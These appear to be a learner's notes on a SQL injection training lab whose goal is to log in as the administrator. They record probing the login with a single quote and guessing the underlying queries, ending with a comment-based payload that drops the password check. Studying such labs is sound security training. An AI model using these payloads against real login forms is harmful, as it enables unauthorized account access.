SQL injection vulnerability - login functionality

SELECT * fROM users WHERE username = 'wiener' AND password = 'bluecheese'

End Goal: 
Perform SQLi attack that logs in to the application
as the administrator user.

Analysis
------------

login: admin admin

Invalid username or password - non verbose generic error message 

it's good to use this one because if it would have said username 
was invalid then attacker would have tried to enum username so 
thats a Vulnerability on its own.

login: username = ' & password = anything

we got Iternal Server Error i.e., something is wrong with the application

SQL QUERY Guess: 
    SELECT firstname FROM users WHERE username = 'admin' and password = 'admin'

    SELECT firtsname FROM users WHERE username = ''' and password = 'admin'
    
    SELECT firstname FROM users WHERE username = ''--' and password = 'admin'

    SELECT firstname FROM users WHERE username = 'admin'
